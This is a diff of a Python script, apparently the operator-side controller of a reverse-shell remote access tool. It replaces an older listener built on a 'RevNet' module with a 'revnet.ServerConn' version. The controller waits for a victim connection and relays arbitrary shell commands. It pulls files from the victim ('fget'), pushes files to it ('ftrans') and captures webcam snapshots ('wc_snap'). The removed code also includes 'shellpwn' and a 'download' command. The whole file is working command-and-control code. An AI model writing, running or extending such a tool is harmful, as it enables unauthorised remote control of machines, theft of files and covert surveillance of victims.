@@ -1,204 +1,96 @@
-#!/usr/bin/python3
-import socket
+import revnet
+import os
 import sys
 import time
-import _thread
-import RevNet
-import os
 
-def nop():
+if __name__=='__main__':
 
-	return 0
+	if len(sys.argv)!=3:
 
-if(len(sys.argv)!=3):
+		print("USAGE: "+sys.argv[0]+" <host> <port>")
 
-	print("Usage "+sys.argv[0]+" <ip> <port>")
+		exit()
 
-	exit()
+	Host=sys.argv[1]
+	Port=sys.argv[2]
+	print("Binding "+Host+":"+Port)
+	Conn=revnet.ServerConn(Host,int(Port))
+	print("Connected: "+Conn.SocketAddr[0])
 
-def smake():
+	CurrentDir=Conn.recvstring()
 
-    try:
+	while True:
 
-        global host
+		Command=input(CurrentDir+'>')
 
-        global port
+		if Command=='l_help':
 
-        global s
+			print("l_help - Print this help message.")
 
-        host=sys.argv[1]
+		elif Command[0:3]=='lcd':
 
-        port=int(sys.argv[2])
+			os.chdir(Command[4:])
 
-        s=socket.socket()
+		elif Command[0:3]=='lls':
 
-    except socket.error as msg:
-        print(str(msg))
+			for f in os.listdir():
 
-def sbind():
+				print(f)
 
-    try:
+		elif Command[0:4]=='fget':
 
-        global host
+			Conn.sendstring(Command)
+			Ack=Conn.recvstring()
+			if Ack=='Bad':
+				print('Error getting file')
+			else:
+				Conn.recvfile(Command[5:])
+				print('File received!')
+			CurrentDir=Conn.recvstring()
 
-        global port
+		elif Command[0:6]=='ftrans':
 
-        global s
+			Conn.sendstring(Command)
+			try:
 
-        print("Binding to: "+str(port))
+				f=open(Command[7:],'rb')
+				f.close()
+				Ack='Successful'
 
-        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+			except:
 
-        s.bind((host,port))
+				Ack='Bad'
+			Conn.sendstring(Ack)
+			time.sleep(0.5)
+			Ack=Conn.sendfile(Command[7:])
+			time.sleep(0.5)
+			if Ack=="Unable to open file":
+				print(Ack)
+			else:
+				print('File sent!')
+			CurrentDir=Conn.recvstring()
 
-        s.listen(5)
-        
-    except socket.error as msg:
+		elif Command[0:7]=='wc_snap':
 
-        print(str(msg))
+			Conn.sendstring(Command)
+			Ack=Conn.recvstring()
+			if Ack=='Bad':
+				print('Error getting file')
+			else:
+				print('Saving as '+Ack)
+				Conn.recvfile(Ack)
+				print('File received!')
+			CurrentDir=Conn.recvstring()
 
-def saccept():
+		elif Command=='exit':
 
-    global s
+			Conn.sendstring(Command)
+			Conn.close()
+			exit()
 
-    try:
+		else:
 
-        global c,addr
-
-        c,addr=s.accept()
-
-        print("Connected: "+addr[0]+":"+str(addr[1]))
-
-        passcmd()
-
-        c.close()
-
-    except socket.error as msg:
-
-        print(str(msg))
-
-def passcmd():
-
-    global c
-
-    global s
-
-    cdir=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
-
-    print(cdir,end="")
-
-    while True:
-
-        cmd=input()
-
-        if cmd=='quit':
-
-            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
-
-            time.sleep(10)
-
-            c.close()
-
-            s.close()
-
-            sys.exit()
-
-        elif cmd=="kill_quit":
-
-            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
-
-            time.sleep(10)
-
-            c.close()
-
-            s.close()
-
-            sys.exit()
-
-        elif cmd[:5]=="lexec":
-
-            os.system(cmd[6:])
-
-            print(cdir,end="")
-
-        elif cmd=="lpwd":
-
-            print(os.getcwd())
-
-            print(cdir,end="")
-
-        elif cmd[:3]=="lcd":
-
-            os.chdir(cmd[4:])
-
-            print(os.getcwd())
-
-            print(cdir,end="")
-
-        elif cmd=="lls":
-
-            files=os.listdir()
-
-            for filename in files:
-
-                print(filename)
-
-            print(cdir,end="")
-
-        elif cmd[:6]=="ftrans":
-
-            RevNet.send_all(c,str.encode(RevNet.enc("ftrans")))
-
-            RevNet.ftrans(c,cmd[7:])
-
-            print(cdir,end="")
-
-        elif cmd[:8]=="download":
-
-            fname=input("File Name:")
-
-            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
-
-            RevNet.send_all(c,str.encode(RevNet.enc(fname)))
-
-            print(RevNet.recv_all(c).decode())
-
-            print(cdir,end="")
-
-        elif cmd[:8]=="shellpwn":
-
-            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
-
-            print(RevNet.dec(RevNet.recv_all(c).decode()))
-
-            print(cdir,end="")
-
-        elif cmd[:4]=="fget":
-
-            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
-
-            RevNet.frecv(c)
-
-            print(cdir,end="")
-
-        elif len(str.encode(cmd))>0:
-
-            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
-
-            crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
-
-            i=crecv.find('>')
-
-            n=crecv.find('`')
-
-            cdir=crecv[n+1:i+1]
-
-            print(crecv.replace('`',''), end="")
-
-def main():
-
-    smake()
-    sbind()
-    saccept()
-
-main()
+			Conn.sendstring(Command)
+			Ret=Conn.recvstring()
+			CurrentDir=Conn.recvstring()
+			print(Ret+'\n')
